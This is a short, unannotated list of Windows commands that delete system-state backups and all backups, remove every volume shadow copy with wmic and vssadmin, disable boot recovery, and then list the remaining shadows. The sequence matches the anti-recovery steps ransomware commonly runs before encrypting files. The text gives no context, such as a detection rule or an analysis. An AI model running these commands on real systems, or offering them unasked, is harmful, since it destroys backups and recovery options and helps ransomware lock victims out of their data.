wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0
wbadmin DELETE BACKUP -keepVersions:0
wmic SHADOWCOPY DELETE
vssadmin Delete Shadows /All /Quiet
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures
vssadmin list shadows